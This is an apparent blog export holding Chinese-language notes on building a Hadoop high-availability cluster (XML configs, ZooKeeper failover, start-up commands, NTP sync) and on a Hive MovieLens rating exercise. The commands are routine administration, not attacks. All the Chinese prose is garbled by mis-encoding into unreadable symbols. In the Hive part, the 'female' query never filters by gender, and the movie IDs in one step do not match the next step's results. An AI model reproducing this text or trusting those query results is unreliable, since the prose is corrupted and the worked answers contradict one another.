&lt;name&gt;dfs.ha.fencing.ssh.connect-timeout&lt;/name&gt; &lt;value&gt;30000&lt;/value&gt; &lt;/property&gt; &lt;!-- é…ç½®JNå­˜æ”¾editçš„æœ¬åœ°è·¯å¾„ã€‚ --&gt; &lt;property&gt; &lt;name&gt;dfs.journalnode.edits.dir&lt;/name&gt; &lt;value&gt;/home/ap/hadoopdata/journal&lt;/value&gt; &lt;/property&gt; &lt;/configuration&gt; é…ç½® core-site.xml, è¿™é‡Œç»™å‡ºå®Œæ•´é…ç½® (ç›®å‰ä¸åŒ…æ‹¬ Hive é…ç½®) 1234567891011121314151617181920212223[core-site.xml]------------------------------------------------------------&lt;configuration&gt; &lt;!-- æŒ‡å®š hdfs çš„ nameservice ä¸º mycluster --&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://mycluster&lt;/value&gt; &lt;/property&gt; &lt;!-- æŒ‡å®š hadoop å·¥ä½œç›®å½• --&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;/home/ap/hadoopdata&lt;/value&gt; &lt;/property&gt; &lt;!-- æŒ‡å®šzké›†ç¾¤è®¿é—®åœ°å€ --&gt; &lt;property&gt; &lt;name&gt;ha.zookeeper.quorum&lt;/name&gt; &lt;value&gt;cs1:2181,cs2:2181,cs3:2181&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; é…ç½®mapred-site.xml 1234567891011121314151617181920212223[mapred-site.xml]-------------------&lt;configuration&gt; &lt;!-- æŒ‡å®š mr æ¡†æ¶ä¸º yarn æ–¹å¼ --&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; &lt;!-- è®¾ç½® mapreduce çš„å†å²æœåŠ¡å™¨åœ°å€å’Œç«¯å£å· --&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.address&lt;/name&gt; &lt;value&gt;cs1:10020&lt;/value&gt; &lt;/property&gt; &lt;!-- mapreduce å†å²æœåŠ¡å™¨çš„ web è®¿é—®åœ°å€ --&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;/name&gt; &lt;value&gt;cs1:19888&lt;/value&gt; &lt;/property&gt; &lt;/configuration&gt; æŠŠ/home/ap/apps/hadoop/etc/*å‘ç»™å…¶ä»–æ‰€æœ‰èŠ‚ç‚¹ 2-6 æ³¨æ„: è½¯é“¾æ¥scp çš„æ—¶å€™ä¼šæœ‰é—®é¢˜, æœ€ç»ˆä¿è¯æ¯ä¸ªèŠ‚ç‚¹è·Ÿ cs1ä¸€æ ·å°±å¯ä»¥äº†,å¯ä»¥æ¯ä¸ªèŠ‚ç‚¹å•ç‹¬ä¿®æ”¹, ä¹Ÿå¯ä»¥å†™è„šæœ¬ä¸€èµ·ä¿®æ”¹ ln -sfT /home/ap/apps/hadoop/etc/ha /home/ap/apps/hadoop/etc/hadoop éƒ¨ç½²ç»†èŠ‚ 12345678910111213141516171819202122232425262728293031323334350.åœ¨ zk èŠ‚ç‚¹å¯åŠ¨ zkServercs1-cs3: $&gt;zkServer.sh start1.åœ¨jnèŠ‚ç‚¹åˆ†åˆ«å¯åŠ¨jnè¿›ç¨‹$&gt;hadoop-daemon.sh start journalnode2.å¯åŠ¨jnä¹‹åï¼Œåœ¨ä¸¤ä¸ªNNä¹‹é—´è¿›è¡Œdiskå…ƒæ•°æ®åŒæ­¥ a)å¦‚æœæ˜¯å…¨æ–°é›†ç¾¤ï¼Œå…ˆformatæ–‡ä»¶ç³»ç»Ÿ,åªéœ€è¦åœ¨ä¸€ä¸ªnnä¸Šæ‰§è¡Œã€‚ [cs1] $&gt;hadoop namenode -format b)å¦‚æœå°†éHAé›†ç¾¤è½¬æ¢æˆHAé›†ç¾¤ï¼Œå¤åˆ¶åŸNNçš„metadataåˆ°å¦ä¸€ä¸ªnn. 1.æ­¥éª¤ä¸€ [cs1] $&gt;scp -r /home/centos/hadoop/dfs ap@cs6:/home/centos/hadoop/ 2.æ­¥éª¤äºŒ åœ¨æ–°çš„nn(æœªæ ¼å¼åŒ–çš„nn)ä¸Šè¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼Œå®ç°å¾…å‘½çŠ¶æ€å¼•å¯¼ã€‚ [cs6] $&gt;hdfs namenode -bootstrapStandby //éœ€è¦cs1ä¸ºå¯åŠ¨çŠ¶æ€,æç¤ºæ˜¯å¦æ ¼å¼åŒ–,é€‰æ‹©N.3.åœ¨ä¸€ä¸ªNNä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå®Œæˆeditæ—¥å¿—åˆ°jnèŠ‚ç‚¹çš„ä¼ è¾“ã€‚$&gt;hdfs namenode -initializeSharedEdits#æŸ¥çœ‹cs2,cs3,cs4 è¿™å‡ ä¸ª jn èŠ‚ç‚¹æ˜¯å¦æœ‰editæ•°æ®.4.å¯åŠ¨æ‰€æœ‰èŠ‚ç‚¹.[cs1]$&gt;hadoop-daemon.sh start namenode //å¯åŠ¨åç§°èŠ‚ç‚¹$&gt;hadoop-daemons.sh start datanode //å¯åŠ¨æ‰€æœ‰æ•°æ®èŠ‚ç‚¹[2,3,4]$&gt;hadoop-daemon.sh start journalnode[cs6]$&gt;hadoop-daemon.sh start namenode //å¯åŠ¨åç§°èŠ‚ç‚¹ HA ç®¡ç† 12345678910# æŸ¥çœ‹web ç•Œé¢, æ˜¯å¦æ˜¯2ä¸ª standby çŠ¶æ€http://cs1:50070/http://cs6:50070/hdfs haadmin : æŸ¥çœ‹ ha å¸®åŠ©-----------------$&gt;hdfs haadmin -transitionToActive nn1 //åˆ‡æˆæ¿€æ´»æ€$&gt;hdfs haadmin -transitionToStandby nn1 //åˆ‡æˆå¾…å‘½æ€$&gt;hdfs haadmin -transitionToActive --forceactive nn2//å¼ºè¡Œæ¿€æ´»$&gt;hdfs haadmin -failover nn1 nn2 //æ¨¡æ‹Ÿå®¹ç¾æ¼”ç¤º,ä»nn1åˆ‡æ¢åˆ°nn2 åŠ å…¥ Zookeeper å®¹ç¾æœåŠ¡ zkfc 12345678910111213141516171819202122232425262728293031323334353637&lt;!-- 1.éƒ¨ç½²å®¹ç¾ --&gt;------------------------------a.åœæ­¢æ‰€æœ‰è¿›ç¨‹$&gt;stop-all.shb.é…ç½®hdfs-site.xmlï¼Œå¯ç”¨è‡ªåŠ¨å®¹ç¾.[hdfs-site.xml]&lt;property&gt; &lt;name&gt;dfs.ha.automatic-failover.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt;&lt;/property&gt;c.é…ç½®core-site.xmlï¼ŒæŒ‡å®šzkçš„è¿æ¥åœ°å€.&lt;property&gt; &lt;name&gt;ha.zookeeper.quorum&lt;/name&gt; &lt;value&gt;cs1:2181,cs2:2181,cs3:2181&lt;/value&gt;&lt;/property&gt;d.åˆ†å‘ä»¥ä¸Šä¸¤ä¸ªæ–‡ä»¶åˆ°æ‰€æœ‰èŠ‚ç‚¹ã€‚&lt;!-- 2.ç™»å½•å…¶ä¸­çš„ä¸€å°NN(s201),åœ¨ZKä¸­åˆå§‹åŒ–HAçŠ¶æ€, åˆ›å»º namenode çš„ å‘½åç©ºé—´èŠ‚ç‚¹ mycluster --&gt;------------------------------------$&gt;hdfs zkfc -formatZK&lt;!-- 3.å¯åŠ¨hdfsè¿›ç¨‹. --&gt; $&gt;start-dfs.sh&lt;!-- 4.æŸ¥çœ‹ webUI, æ˜¯å¦æœ‰ä¸€å°è‡ªåŠ¨åˆ‡æ¢ä¸º active çŠ¶æ€äº† --&gt;http://cs1:50070/http://cs6:50070/&lt;!-- 5.æµ‹è¯•è‡ªåŠ¨å®¹ç¾(å¦‚æœcs6æ˜¯æ´»è·ƒèŠ‚ç‚¹) --&gt; $&gt;kill -9 cs6çš„ namenodeè¿›ç¨‹å·è§‚å¯Ÿ cs1:50070çš„çŠ¶æ€å˜åŒ– é…ç½®RMçš„HAè‡ªåŠ¨å®¹ç¾ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021.é…ç½®yarn-site.xml&lt;configuration&gt; &lt;!-- æ˜¯å¦å…è®¸é«˜å¯ç”¨ --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!-- Identifies the cluster. Used by the elector to ensure an RM doesnâ€™t take over as Active for another cluster. --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.cluster-id&lt;/name&gt; &lt;value&gt;cluster1&lt;/value&gt; &lt;/property&gt; &lt;!-- RM çš„ id --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.rm-ids&lt;/name&gt; &lt;value&gt;rm1,rm2&lt;/value&gt; &lt;/property&gt; &lt;!-- 2å° RM çš„å®¿ä¸» --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname.rm1&lt;/name&gt; &lt;value&gt;cs1&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname.rm2&lt;/name&gt; &lt;value&gt;cs6&lt;/value&gt; &lt;/property&gt; &lt;!-- é…ç½®webç•Œé¢ --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.webapp.address.rm1&lt;/name&gt; &lt;value&gt;cs1:8088&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.webapp.address.rm2&lt;/name&gt; &lt;value&gt;cs6:8088&lt;/value&gt; &lt;/property&gt; &lt;!-- zookeeper åœ°å€ --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.zk-address&lt;/name&gt; &lt;value&gt;cs1:2181,cs2:2181,cs3:2181&lt;/value&gt; &lt;/property&gt; &lt;!-- YARN é›†ç¾¤ä¸º MapReduce ç¨‹åºæä¾›çš„ shuffle æœåŠ¡(åŸæœ¬çš„) --&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; &lt;!-- ===========ä»¥ä¸‹æ˜¯å¯é€‰çš„============= --&gt; &lt;!-- å¼€å¯ YARN é›†ç¾¤çš„æ—¥å¿—èšåˆåŠŸèƒ½ --&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation-enable&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!-- YARN é›†ç¾¤çš„èšåˆæ—¥å¿—æœ€é•¿ä¿ç•™æ—¶é•¿ --&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation.retain-seconds&lt;/name&gt; &lt;value&gt;86400&lt;/value&gt; &lt;/property&gt; &lt;!-- å¯ç”¨è‡ªåŠ¨æ¢å¤ --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.recovery.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!-- æŒ‡å®š resourcemanager çš„çŠ¶æ€ä¿¡æ¯å­˜å‚¨åœ¨ zookeeper é›†ç¾¤ä¸Š--&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.store.class&lt;/name&gt; &lt;value&gt;org.apache.hadoop.yarn.server.resourcemanager.recovery.ZKRMStateStore&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt;------------------------------------------------------------------2.ä½¿ç”¨ç®¡ç†å‘½ä»¤&lt;!-- æŸ¥çœ‹çŠ¶æ€ --&gt;$&gt;yarn rmadmin -getServiceState rm1&lt;!-- åˆ‡æ¢çŠ¶æ€åˆ°standby --&gt;$&gt;yarn rmadmin -transitionToStandby rm13.å¯åŠ¨yarné›†ç¾¤$&gt;start-yarn.sh4.hadoopæ²¡æœ‰å¯åŠ¨ä¸¤ä¸ªresourcemanager,éœ€è¦æ‰‹åŠ¨å¯åŠ¨å¦å¤–ä¸€ä¸ª$&gt;yarn-daemon.sh start resourcemanager5.æŸ¥çœ‹webUI, ç‚¹å‡» About, æŸ¥çœ‹ active æˆ– standbyhttp://cs1:8088http://cs6:80886.åšå®¹ç¾æ¨¡æ‹Ÿ.kill -9 æ´»è·ƒçš„ RM ç«¯å£å·7.æ³¨æ„: å¦‚æœå®¹ç¾å¤±è´¥, æ£€æŸ¥ä¸‹æ¯å°ä¸»æœºæ—¶é—´æ˜¯å¦åŒæ­¥$&gt;sudo ntpdate ntp1.aliyun.com è‡³æ­¤, å¤§åŠŸå‘Šæˆ 4.HA é›†ç¾¤çš„å¯åŠ¨/å…³é—­4.1 HA çš„å¯åŠ¨ä¸€:å•ç‚¹å¯åŠ¨ å¯åŠ¨ zk æœåŠ¡ QuorumPeerMain, å¦åˆ™åé¢ RM ä¼šèµ·ä¸æ¥,è¿ä¸ä¸Š ZK æœåŠ¡cs1-cs3: $&gt; zkServer.sh start å¯åŠ¨ namenode/datanode cs1,cs6: $&gt; hadoop-daemon.sh start namenode cs1/cs6: $&gt; hadoop-daemons.sh start datanode cs6: $&gt; hadoop-daemon.sh start namenode å¯åŠ¨ journalnode cs2-cs4: $&gt; hadoop-daemon.sh start journalnode å¯åŠ¨RM (RM ä¼šè‡ªåŠ¨é€‰å‡ºä¸€ä¸ª active) cs1,cs6: $&gt; yarn-daemon.sh start resourcemanager cs1/cs6: $&gt; yarn-daemons.sh start nodemanager å¯åŠ¨ zk çš„ DFSZKFailoverController cs1,cs6: $&gt; hadoop-daemon.sh start zkfc æ­¤å¤–å¯ä»¥å¯åŠ¨MapReduce çš„å†å²ä»»åŠ¡æœåŠ¡å™¨ [ap@cs1]$&gt; mr-jobhistory-daemon.sh start historyserver ç„¶åè®¿é—®é…ç½®çš„ http://cs1:19888/jobhistory äºŒ:æ‡’æ±‰å¯åŠ¨ å¯åŠ¨ zk æœåŠ¡ QuorumPeerMain, å¦åˆ™åé¢ RM ä¼šèµ·ä¸æ¥,è¿ä¸ä¸Š ZK æœåŠ¡cs1-cs3: $&gt; zkServer.sh start æ‰§è¡Œå¯åŠ¨å…¨éƒ¨ cs1: $&gt; start-all.sh(RM èŠ‚ç‚¹) æˆ–è€…, ä½¿ç”¨æ–°çš„å¯åŠ¨æ–¹å¼ cs1: $&gt; start-dfs.sh(ä»»æ„èŠ‚ç‚¹) cs1: $&gt; start-yarn.sh(åœ¨ RM èŠ‚ç‚¹) å¦ä¸€ä¸ª RM èŠ‚ç‚¹ä¸ä¼šè‡ªå·±å¯åŠ¨,è¦æ‰‹åŠ¨å¯åŠ¨ cs6: $&gt; yarn-daemon.sh start resourcemanager ä¸‰: å¯åŠ¨å®Œæˆå 1234567891011121314151617181920212223242526272829303132============= cs1 jps =============5696 QuorumPeerMain6641 DFSZKFailoverController6338 NameNode6756 ResourceManager6873 Jps============= cs2 jps =============10849 Jps10722 NodeManager10631 JournalNode10541 DataNode127934 QuorumPeerMain============= cs3 jps =============630 NodeManager758 Jps535 JournalNode443 DataNode117503 QuorumPeerMain============= cs4 jps =============79589 Jps79462 NodeManager79368 JournalNode79278 DataNode============= cs5 jps =============23655 Jps23529 NodeManager23423 DataNode============= cs6 jps =============35680 Jps35506 NameNode35608 DFSZKFailoverController21455 ResourceManager 4.2 HA çš„å…³é—­åœ¨ ä¸€å°NN ä¸Šstop-all.sh, æ³¨æ„ zk çš„ server- QuorumPeerMainä¸ä¼šåœæ‰ 5. åœ¨é›†ç¾¤å®ç°æ—¶é—´åŒæ­¥(root ç”¨æˆ·æ“ä½œ)æ€è·¯:æ—¶é—´åŒæ­¥çš„æ–¹å¼ï¼šæ‰¾ä¸€ä¸ªæœºå™¨ï¼Œä½œä¸ºæ—¶é—´æœåŠ¡å™¨ï¼Œæ‰€æœ‰çš„æœºå™¨ä¸è¿™å°é›†ç¾¤æ—¶é—´è¿›è¡Œå®šæ—¶çš„åŒæ­¥ï¼Œæ¯”å¦‚ï¼Œæ¯éš”ååˆ†é’Ÿï¼ŒåŒæ­¥ä¸€æ¬¡æ—¶é—´ã€‚ 5.1 åœ¨cs1ä¸Šä¿®æ”¹ntpæœåŠ¡12345678910111213141516171819202122232425262728293031323334353637383940414243444546471) æ£€æŸ¥ ntp æ˜¯å¦å®‰è£…#root&gt; rpm -qa|grep ntp---ntp-4.2.6p5-10.el6.centos.x86_64fontpackages-filesystem-1.41-1.1.el6.noarchntpdate-4.2.6p5-10.el6.centos.x86_64# å‡ºç°ä¸Šé¢çš„3ä¸ªæ–‡ä»¶, å°±æ˜¯å®‰è£…äº†; å¦‚æœæ²¡æœ‰çš„è¯, ç”¨ yum è£…ä¸€ä¸‹# root&gt; yum inatall -y ntp2) ä¿®æ”¹ ntp é…ç½®æ–‡ä»¶#root&gt; vi /etc/ntp.confä¿®æ”¹å†…å®¹å¦‚ä¸‹ aï¼‰ä¿®æ”¹1ï¼ˆè®¾ç½®æœ¬åœ°ç½‘ç»œä¸Šçš„ä¸»æœºä¸å—é™åˆ¶ã€‚ï¼‰ #restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap ä¸º restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap bï¼‰ä¿®æ”¹2ï¼ˆè®¾ç½®ä¸ºä¸é‡‡ç”¨å…¬å…±çš„æœåŠ¡å™¨ï¼‰ server 0.centos.pool.ntp.org iburst server 1.centos.pool.ntp.org iburst server 2.centos.pool.ntp.org iburst server 3.centos.pool.ntp.org iburst ä¸º #server 0.centos.pool.ntp.org iburst #server 1.centos.pool.ntp.org iburst #server 2.centos.pool.ntp.org iburst #server 3.centos.pool.ntp.org iburst cï¼‰æ·»åŠ 3ï¼ˆæ·»åŠ é»˜è®¤çš„ä¸€ä¸ªå†…éƒ¨æ—¶é’Ÿæ•°æ®ï¼Œä½¿ç”¨å®ƒä¸ºå±€åŸŸç½‘ç”¨æˆ·æä¾›æœåŠ¡ã€‚ï¼‰ server 127.127.1.0 fudge 127.127.1.0 stratum 103ï¼‰ä¿®æ”¹/etc/sysconfig/ntpd æ–‡ä»¶#root&gt; vim /etc/sysconfig/ntpdå¢åŠ å†…å®¹å¦‚ä¸‹ï¼ˆè®©ç¡¬ä»¶æ—¶é—´ä¸ç³»ç»Ÿæ—¶é—´ä¸€èµ·åŒæ­¥ï¼‰SYNC_HWCLOCK=yes4ï¼‰é‡æ–°å¯åŠ¨ntpd#root&gt; service ntpd statusntpd å·²åœ#root&gt; service ntpd startæ­£åœ¨å¯åŠ¨ ntpdï¼š 5) æ‰§è¡Œå¼€æœºå¯åŠ¨ ntpd æœåŠ¡#root&gt; chkconfig ntpd onæŸ¥çœ‹ ntpd æœåŠ¡å¼€æœºå¯åŠ¨çš„çŠ¶æ€#root&gt; chkconfig --list ntpd 5.2 å…¶å®ƒæœºå™¨ä¸Š1234567891ï¼‰åœ¨å…¶ä»–æ‰€æœ‰æœºå™¨é…ç½®10åˆ†é’Ÿä¸æ—¶é—´æœåŠ¡å™¨åŒæ­¥ä¸€æ¬¡#ç¼–å†™å®šæ—¶ä»»åŠ¡è„šæœ¬#root&gt; crontab -e */10 * * * * /usr/sbin/ntpdate hadoop1022) ä¿®æ”¹ä»»æ„æœºå™¨æ—¶é—´#root&gt; date -s "2017-9-11 11:11:11"3) ååˆ†é’ŸåæŸ¥çœ‹æœºå™¨æ—¶é—´æ˜¯å¦ä¸cs1 åŒæ­¥]]></content>
      <categories>
        <category>Hadoop</category>
        <category>hadoop</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Hive-Practice-1 å½±è¯„ç»ƒä¹ ]]></title>
    <url>%2F2018%2F06%2F19%2FHadoop%2F3-Hive%2Fi-Hive-Practice-1-%E5%BD%B1%E8%AF%84%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[ç°æœ‰å¦‚æ­¤ä¸‰ä»½æ•°æ®ï¼š1ã€users.dat æ•°æ®æ ¼å¼ä¸ºï¼š 2::M::56::16::70072å¯¹åº”å­—æ®µä¸ºï¼šUserID BigInt, Gender String, Age Int, Occupation String, Zipcode Stringå¯¹åº”å­—æ®µä¸­æ–‡è§£é‡Šï¼šç”¨æˆ·idï¼Œæ€§åˆ«ï¼Œå¹´é¾„ï¼ŒèŒä¸šï¼Œé‚®æ”¿ç¼–ç  2ã€movies.dat æ•°æ®æ ¼å¼ä¸ºï¼š 2::Jumanji (1995)::Adventure|Childrenâ€™s|Fantasyå¯¹åº”å­—æ®µä¸ºï¼šMovieID BigInt, Title String, Genres Stringå¯¹åº”å­—æ®µä¸­æ–‡è§£é‡Šï¼šç”µå½±IDï¼Œç”µå½±åå­—ï¼Œç”µå½±ç±»å‹ 3ã€ratings.dat æ•°æ®æ ¼å¼ä¸ºï¼š 1::1193::5::978300760å¯¹åº”å­—æ®µä¸ºï¼šUserID BigInt, MovieID BigInt, Rating Double, Timestamped Stringå¯¹åº”å­—æ®µä¸­æ–‡è§£é‡Šï¼šç”¨æˆ·IDï¼Œç”µå½±IDï¼Œè¯„åˆ†ï¼Œè¯„åˆ†æ—¶é—´æˆ³ é¢˜ç›®è¦æ±‚ï¼š æ•°æ®è¦æ±‚ï¼šï¼ˆ1ï¼‰å†™shellè„šæœ¬æ¸…æ´—æ•°æ®ã€‚ï¼ˆhiveä¸æ”¯æŒè§£æå¤šå­—èŠ‚çš„åˆ†éš”ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´hiveåªèƒ½è§£æâ€™:â€™, ä¸æ”¯æŒè§£æâ€™::â€™ï¼Œæ‰€ä»¥ç”¨æ™®é€šæ–¹å¼å»ºè¡¨æ¥ä½¿ç”¨æ˜¯è¡Œä¸é€šçš„ï¼Œè¦æ±‚å¯¹æ•°æ®åšä¸€æ¬¡ç®€å•æ¸…æ´—ï¼‰ï¼ˆ2ï¼‰ä½¿ç”¨Hiveèƒ½è§£æçš„æ–¹å¼è¿›è¡Œ Hiveè¦æ±‚ï¼šï¼ˆ1ï¼‰æ­£ç¡®å»ºè¡¨ï¼Œå¯¼å…¥æ•°æ®ï¼ˆä¸‰å¼ è¡¨ï¼Œä¸‰ä»½æ•°æ®ï¼‰ï¼Œå¹¶éªŒè¯æ˜¯å¦æ­£ç¡® ï¼ˆ2ï¼‰æ±‚è¢«è¯„åˆ†æ¬¡æ•°æœ€å¤šçš„10éƒ¨ç”µå½±ï¼Œå¹¶ç»™å‡ºè¯„åˆ†æ¬¡æ•°ï¼ˆç”µå½±åï¼Œè¯„åˆ†æ¬¡æ•°ï¼‰ 123456789101112131415161718192021222324252627282930313233343536æ€è·¯:1. åˆ†ç»„select movieid, count(movieid) rateCount from ratings group by movieid limit 10;2. æ’åºselect movieid, count(movieid) rateCount from ratings group by movieid order by rateCount desc limit 10;3.joinselect a.movieid mvid, b.Title mvtitle, a.rateCount mvratecount from (select movieid, count(movieid) rateCount from ratings group by movieid order by rateCount desc limit 10) ajoin movies b where a.movieid=b.movieid;==============================ï£¿ å®Œæ•´çš„------------select a.movieid mvid, b.Title mvtitle, a.rateCount mvratecount from (select movieid, count(movieid) rateCount from ratings group by movieid order by rateCount desc limit 10) ajoin movies b where a.movieid=b.movieid;--ç»“æœ---+-------+----------------------------------------------------+--------------+| mvid | mvtitle | mvratecount |+-------+----------------------------------------------------+--------------+| 2858 | American Beauty (1999) | 3428 || 260 | Star Wars: Episode IV - A New Hope (1977) | 2991 || 1196 | Star Wars: Episode V - The Empire Strikes Back (1980) | 2990 || 1210 | Star Wars: Episode VI - Return of the Jedi (1983) | 2883 || 480 | Jurassic Park (1993) | 2672 || 2028 | Saving Private Ryan (1998) | 2653 || 589 | Terminator 2: Judgment Day (1991) | 2649 || 2571 | Matrix, The (1999) | 2590 || 1270 | Back to the Future (1985) | 2583 || 593 | Silence of the Lambs, The (1991) | 2578 |+-------+----------------------------------------------------+--------------+ ï¼ˆ3ï¼‰åˆ†åˆ«æ±‚ç”·æ€§ï¼Œå¥³æ€§å½“ä¸­è¯„åˆ†æœ€é«˜çš„10éƒ¨ç”µå½±ï¼ˆæ€§åˆ«ï¼Œç”µå½±åï¼Œå½±è¯„åˆ†ï¼‰ 123456789101112131415161718192021222324252627# æ³¨æ„,è¿™é‡Œçš„ avg(r.rating) æ˜¯å› ä¸ºgroup byäº† gender,title, ä¹Ÿå°±æ˜¯# è¯´æœ‰ gender,title åˆ†ç»„, æ­¤æ—¶å¯èƒ½å¯¹åº”æ­¤ç»„çš„æœ‰å¤šä¸ªå€¼,# è¿™é‡Œå°±æ˜¯ ç›¸åŒæ€§åˆ«è¯„ä»·ç›¸åŒç”µå½±çš„, è¯„åˆ†æœ‰å¤šä¸ª, æ­¤æ—¶å°±è¦ä½¿ç”¨èšåˆå‡½æ•°,å¾—å‡ºå”¯ä¸€å€¼# å› æ­¤å°±ä½¿ç”¨äº† avg(r.rating)select u.gender, m.title, avg(r.rating) rrfrom ratings r join users u on r.userid=u.userid join movies m on r.movieid=m.movieidwhere u.gender = 'M'group by gender,titleorder by rr desclimit 10;+-----------+--------------------------------------------+------+| u.gender | m.title | rr |+-----------+--------------------------------------------+------+| M | Schlafes Bruder (Brother of Sleep) (1995) | 5.0 || M | Small Wonders (1996) | 5.0 || M | Lured (1947) | 5.0 || M | Bells, The (1926) | 5.0 || M | Dangerous Game (1993) | 5.0 || M | Baby, The (1973) | 5.0 || M | Gate of Heavenly Peace, The (1995) | 5.0 || M | Follow the Bitch (1998) | 5.0 || M | Ulysses (Ulisse) (1954) | 5.0 || M | Angela (1995) | 5.0 |+-----------+--------------------------------------------+------+ ï¼ˆ4ï¼‰æ±‚movieid = 2116è¿™éƒ¨ç”µå½±å„å¹´é¾„æ®µï¼ˆå› ä¸ºå¹´é¾„å°±åªæœ‰7ä¸ªï¼Œå°±æŒ‰è¿™ä¸ª7ä¸ªåˆ†å°±å¥½äº†ï¼‰çš„å¹³å‡å½±è¯„ï¼ˆå¹´é¾„æ®µï¼Œå½±è¯„åˆ†ï¼‰ 12345# æ³¨æ„: æ²¡æœ‰æ­§ä¹‰çš„å­—æ®µ, å¯ä»¥ä¸ç”¨æŒ‡æ˜æ˜¯è°çš„å±æ€§select age, avg(r.rating) avgrating from ratings r join users u on r.userid=u.useridwhere movieid=2116group by age; ï¼ˆ5ï¼‰æ±‚æœ€å–œæ¬¢çœ‹ç”µå½±ï¼ˆå½±è¯„æ¬¡æ•°æœ€å¤šï¼‰çš„é‚£ä½å¥³æ€§è¯„æœ€é«˜åˆ†çš„10éƒ¨ç”µå½±çš„å¹³å‡å½±è¯„åˆ†ï¼ˆè§‚å½±è€…ï¼Œç”µå½±åï¼Œå½±è¯„åˆ†ï¼‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# 1.å…ˆæ‹¿åˆ° å½±è¯„æ¬¡æ•°æœ€å¤šçš„å¥³æ€§(id)0: jdbc:hive2://cs2:10000&gt; select UserID, count(UserID) count from ratings. . . . . . . . . . . . .&gt; group by UserID. . . . . . . . . . . . .&gt; order by count desc. . . . . . . . . . . . .&gt; limit 1;+---------+--------+| userid | count |+---------+--------+| 4169 | 2314 |+---------+--------+# 2.æ‹¿åˆ°æ­¤äººè¯„åˆ†æœ€é«˜çš„10éƒ¨ç”µå½±, æ­¤äºº userid, ç”µå½± id, æ­¤äººè¯„åˆ†## ä¸€å®šè¦å»é‡select distinct(MovieID) MovieID, Rating from ratings where UserID=4169 order by Rating desclimit 10;+----------+---------+| movieid | rating |+----------+---------+| 78 | 5.0 || 73 | 5.0 || 72 | 5.0 || 58 | 5.0 || 55 | 5.0 || 50 | 5.0 || 41 | 5.0 || 36 | 5.0 || 25 | 5.0 || 17 | 5.0 |+----------+---------+3.è¿™10éƒ¨ç”µå½±çš„(è§‚å½±è€…ï¼Œç”µå½±åï¼Œå¹³å‡å½±è¯„åˆ†)è§‚å½±è€…è¿˜æ²¡å†™select t.MovieID, m.Title, avg(r.rating) avgrating from topten t join ratings r on t.MovieID=r.MovieIDjoin movies m on t.MovieID=m.MovieIDgroup by t.MovieID,m.Title;+------------+-----------------------------------------------+---------------------+| t.movieid | m.title | avgrating |+------------+-----------------------------------------------+---------------------+| 3849 | Spiral Staircase, The (1946) | 4.046511627906977 || 3870 | Our Town (1940) | 3.857142857142857 || 3871 | Shane (1953) | 3.839344262295082 || 3893 | Nurse Betty (2000) | 3.5026833631484795 || 3897 | Almost Famous (2000) | 4.22635814889336 || 3910 | Dancer in the Dark (2000) | 3.82 || 3927 | Fantastic Voyage (1966) | 3.5804597701149423 || 3928 | Abbott and Costello Meet Frankenstein (1948) | 3.441747572815534 || 3929 | Bank Dick, The (1940) | 3.993197278911565 || 3932 | Invisible Man, The (1933) | 3.75 |+------------+-----------------------------------------------+---------------------+ ï¼ˆ6ï¼‰æ±‚å¥½ç‰‡ï¼ˆè¯„åˆ†&gt;=4.0ï¼‰æœ€å¤šçš„é‚£ä¸ªå¹´ä»½çš„æœ€å¥½çœ‹çš„10éƒ¨ç”µå½±ï¼ˆ7ï¼‰æ±‚1997å¹´ä¸Šæ˜ 